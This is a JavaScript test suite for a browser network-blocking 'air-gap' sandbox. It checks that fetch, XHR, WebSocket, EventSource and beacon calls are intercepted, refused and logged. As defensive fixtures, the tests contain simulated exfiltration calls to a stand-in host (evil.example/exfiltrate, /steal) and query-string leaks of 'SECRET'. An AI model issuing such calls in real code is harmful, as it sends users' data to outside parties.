import { afterEach, describe, test } from "node:test";
import assert from "node:assert/strict";

import {
  FARADAY_WRAPPED_APIS,
  FaradayAirGapError,
  clearInterceptionLog,
  getAirGapTelemetry,
  getInterceptionLog,
  installFaradaySandbox,
  isAirGapLocked,
  setAirGapLocked,
  subscribeAirGap,
  uninstallFaradaySandbox
} from "../src/security/faraday-airgap.js";

function createSyntheticTarget(baseHref = "https://krunked-fpv.github.io/clausehound-ai/") {
  const bus = new EventTarget();
  const capturedEvents = [];
  bus.addEventListener("clausehound:airgap-toggle", (event) => {
    capturedEvents.push(event.detail);
  });

  const calls = {
    fetch: [],
    xhrOpen: [],
    xhrSend: [],
    ws: [],
    es: [],
    beacon: []
  };

  const origFetch = async function mockFetch(input, init) {
    calls.fetch.push({ input, init });
    return { ok: true, status: 200, text: async () => "ok" };
  };

  class MockXMLHttpRequest {
    open(method, url) {
      calls.xhrOpen.push({ method, url });
    }
    send(body) {
      calls.xhrSend.push({ body });
    }
  }

  class MockWebSocket {
    static CONNECTING = 0;
    static OPEN = 1;
    static CLOSING = 2;
    static CLOSED = 3;
    constructor(url, protocols) {
      calls.ws.push({ url, protocols });
    }
  }

  class MockEventSource {
    static CONNECTING = 0;
    static OPEN = 1;
    static CLOSED = 2;
    constructor(url) {
      calls.es.push({ url });
    }
  }

  const origSendBeacon = function mockSendBeacon(url, data) {
    calls.beacon.push({ url, data });
    return true;
  };

  const target = {
    location: {
      href: baseHref,
      origin: new URL(baseHref).origin
    },
    navigator: {
      onLine: true,
      sendBeacon: origSendBeacon
    },
    fetch: origFetch,
    XMLHttpRequest: MockXMLHttpRequest,
    WebSocket: MockWebSocket,
    EventSource: MockEventSource,
    CustomEvent,
    addEventListener: bus.addEventListener.bind(bus),
    removeEventListener: bus.removeEventListener.bind(bus),
    dispatchEvent: bus.dispatchEvent.bind(bus)
  };

  return {
    target,
    bus,
    calls,
    capturedEvents,
    originals: {
      fetch: origFetch,
      xhrOpen: MockXMLHttpRequest.prototype.open,
      xhrSend: MockXMLHttpRequest.prototype.send,
      WebSocket: MockWebSocket,
      EventSource: MockEventSource,
      sendBeacon: origSendBeacon
    }
  };
}

describe("Faraday Air-Gap Zero-Network Sandbox", () => {
  afterEach(() => {
    uninstallFaradaySandbox();
    clearInterceptionLog();
    setAirGapLocked(true);
  });

  test("wraps all 5 network primitives idempotently and restores exact originals on uninstall", () => {
    assert.deepEqual(FARADAY_WRAPPED_APIS, [
      "fetch",
      "XMLHttpRequest",
      "WebSocket",
      "EventSource",
      "sendBeacon"
    ]);

    const { target, originals } = createSyntheticTarget();
    const res1 = installFaradaySandbox({ targetGlobal: target });
    assert.equal(res1.installed, true);
    assert.equal(isAirGapLocked(), true);

    assert.notEqual(target.fetch, originals.fetch);
    assert.notEqual(target.XMLHttpRequest.prototype.open, originals.xhrOpen);
    assert.notEqual(target.XMLHttpRequest.prototype.send, originals.xhrSend);
    assert.notEqual(target.WebSocket, originals.WebSocket);
    assert.notEqual(target.EventSource, originals.EventSource);
    assert.notEqual(target.navigator.sendBeacon, originals.sendBeacon);

    const wrappedFetch = target.fetch;
    const res2 = installFaradaySandbox({ targetGlobal: target });
    assert.equal(res2.installed, true);
    assert.equal(target.fetch, wrappedFetch);

    res1.uninstall();
    assert.equal(target.fetch, originals.fetch);
    assert.equal(target.XMLHttpRequest.prototype.open, originals.xhrOpen);
    assert.equal(target.XMLHttpRequest.prototype.send, originals.xhrSend);
    assert.equal(target.WebSocket, originals.WebSocket);
    assert.equal(target.EventSource, originals.EventSource);
    assert.equal(target.navigator.sendBeacon, originals.sendBeacon);
    assert.equal(getAirGapTelemetry().installed, false);
  });

  test("blocks cross-origin HTTP/HTTPS, protocol-relative //evil.example, sockets, beacons, and POST payloads with 0 outboundBytes", async () => {
    const { target, calls, capturedEvents } = createSyntheticTarget();
    installFaradaySandbox({ targetGlobal: target, initialLocked: true });

    await assert.rejects(
      () => target.fetch("https://evil.example/exfiltrate"),
      (err) => err instanceof FaradayAirGapError && err.code === "FARADAY_AIRGAP_BLOCKED" && err.api === "fetch"
    );
    await assert.rejects(
      () => target.fetch("http://evil.example/steal"),
      (err) => err instanceof FaradayAirGapError && err.reason === "cross-origin-blocked"
    );
    await assert.rejects(
      () => target.fetch("//evil.example/protocol-relative"),
      (err) => err instanceof FaradayAirGapError && err.reason === "cross-origin-blocked"
    );
    await assert.rejects(
      () => target.fetch("./api/collect", { method: "POST", body: "CONFIDENTIAL_PROSE" }),
      (err) => err instanceof FaradayAirGapError && err.reason === "non-get-method-blocked"
    );
    await assert.rejects(
      () => target.fetch("./api/ping", { method: "GET", body: "SECRET_GET_BODY" }),
      (err) => err instanceof FaradayAirGapError && err.reason === "payload-body-blocked"
    );
    await assert.rejects(
      () => target.fetch(new Request("https://evil.example/request-obj", { method: "POST" })),
      (err) => err instanceof FaradayAirGapError && err.reason === "cross-origin-blocked"
    );

    const xhr = new target.XMLHttpRequest();
    assert.throws(
      () => xhr.open("GET", "https://evil.example/xhr"),
      (err) => err instanceof FaradayAirGapError && err.api === "XMLHttpRequest"
    );
    assert.throws(
      () => xhr.open("GET", "//evil.example/xhr-proto"),
      (err) => err instanceof FaradayAirGapError && err.reason === "cross-origin-blocked"
    );
    assert.throws(
      () => xhr.open("POST", "./local-endpoint"),
      (err) => err instanceof FaradayAirGapError && err.reason === "non-get-method-blocked"
    );
    xhr.open("GET", "./manifest.json");
    assert.throws(
      () => xhr.send("LEAKED_BODY"),
      (err) => err instanceof FaradayAirGapError && err.reason === "payload-body-blocked"
    );

    assert.throws(
      () => new target.WebSocket("ws://evil.example/socket"),
      (err) => err instanceof FaradayAirGapError && err.api === "WebSocket"
    );
    assert.throws(
      () => new target.WebSocket("wss://krunked-fpv.github.io/socket"),
      (err) => err instanceof FaradayAirGapError && err.api === "WebSocket"
    );
    assert.throws(
      () => new target.EventSource("https://evil.example/sse"),
      (err) => err instanceof FaradayAirGapError && err.api === "EventSource"
    );
    assert.throws(
      () => new target.EventSource("./events"),
      (err) => err instanceof FaradayAirGapError && err.api === "EventSource"
    );

    const beaconCross = target.navigator.sendBeacon("https://evil.example/beacon", "SECRET");
    const beaconSame = target.navigator.sendBeacon("./beacon", "SECRET");
    assert.equal(beaconCross, false);
    assert.equal(beaconSame, false);

    assert.equal(calls.fetch.length, 0);
    assert.equal(calls.xhrSend.length, 0);
    assert.equal(calls.ws.length, 0);
    assert.equal(calls.es.length, 0);
    assert.equal(calls.beacon.length, 0);

    const telemetry = getAirGapTelemetry();
    assert.equal(telemetry.outboundBytes, 0);
    assert.equal(telemetry.blockedCount, 16);

    const log = getInterceptionLog();
    assert.equal(log.length, 16);
    assert.ok(log.every((entry) => entry.blocked === true));
    assert.equal(capturedEvents.length, 16);
    assert.equal(capturedEvents[capturedEvents.length - 1].blockedCount, 16);
    assert.equal(capturedEvents[capturedEvents.length - 1].outboundBytes, 0);

    // Verify getInterceptionLog returns defensive copies
    log[0].blocked = false;
    assert.equal(getInterceptionLog()[0].blocked, true);
  });

  test("blocks same-origin query-string exfiltration even when allowSameOriginGet is true, and respects allowSameOriginGet: false", async () => {
    const { target, calls } = createSyntheticTarget();
    installFaradaySandbox({
      targetGlobal: target,
      allowSameOriginGet: true,
      initialLocked: true
    });

    await assert.rejects(
      () => target.fetch("./data?leak=SECRET"),
      (err) => err instanceof FaradayAirGapError && err.reason === "query-exfiltration-blocked"
    );
    const xhr = new target.XMLHttpRequest();
    assert.throws(
      () => xhr.open("GET", "./data?leak=SECRET"),
      (err) => err instanceof FaradayAirGapError && err.reason === "query-exfiltration-blocked"
    );
    assert.equal(calls.fetch.length, 0);

    // Clean same-origin static asset GET succeeds while locked when allowSameOriginGet: true
    const okRes = await target.fetch("./manifest.json");
    assert.equal(okRes.status, 200);
    assert.equal(calls.fetch.length, 1);
    assert.equal(getAirGapTelemetry().outboundBytes, 0);

    // Now test allowSameOriginGet: false
    uninstallFaradaySandbox();
    clearInterceptionLog();
    installFaradaySandbox({
      targetGlobal: target,
      allowSameOriginGet: false,
      initialLocked: true
    });

    await assert.rejects(
      () => target.fetch("./manifest.json"),
      (err) => err instanceof FaradayAirGapError && err.reason === "same-origin-get-disabled"
    );
    await assert.rejects(
      () => target.fetch("./data?leak=SECRET"),
      (err) => err instanceof FaradayAirGapError && err.reason === "query-exfiltration-blocked"
    );
    assert.equal(getAirGapTelemetry().blockedCount, 2);
    assert.equal(getAirGapTelemetry().outboundBytes, 0);
  });

  test("emits clausehound:airgap-toggle on lock flip, allows unlocked pass-through, and tracks hardwareOffline", async () => {
    const { target, calls, capturedEvents, bus } = createSyntheticTarget();
    const subSnapshots = [];
    const unsub = subscribeAirGap((snap) => subSnapshots.push(snap));

    let perfCallback = null;
    target.PerformanceObserver = class MockPerfObserver {
      constructor(cb) {
        perfCallback = cb;
      }
      observe() {}
      disconnect() {}
    };

    installFaradaySandbox({ targetGlobal: target, initialLocked: true });

    // Hardware offline event flips telemetry
    target.navigator.onLine = false;
    bus.dispatchEvent(new Event("offline"));
    assert.equal(getAirGapTelemetry().hardwareOffline, true);
    assert.ok(capturedEvents.some((e) => e.hardwareOffline === true));

    // PerformanceObserver flags unexpected cross-origin resource
    perfCallback?.({
      getEntries: () => [{ entryType: "resource", name: "https://tracker.evil.example/pixel.png", initiatorType: "img" }]
    });
    assert.equal(getAirGapTelemetry().blockedCount, 1);

    // Unlock allows outbound traffic and tracks outboundBytes
    assert.equal(setAirGapLocked(false), false);
    assert.equal(isAirGapLocked(), false);
    assert.ok(capturedEvents.some((e) => e.locked === false));

    await target.fetch("https://example.org/upload", { method: "POST", body: "12345" });
    new target.WebSocket("wss://example.org/ws");
    assert.equal(target.navigator.sendBeacon("https://example.org/b", "abc"), true);

    assert.equal(calls.fetch.length, 1);
    assert.equal(calls.ws.length, 1);
    assert.equal(calls.beacon.length, 1);
    assert.equal(getAirGapTelemetry().outboundBytes, 8);

    clearInterceptionLog();
    assert.equal(getAirGapTelemetry().blockedCount, 0);
    assert.equal(getAirGapTelemetry().outboundBytes, 0);
    assert.equal(getInterceptionLog().length, 0);
    assert.ok(subSnapshots.length >= 4);

    unsub();
  });
});
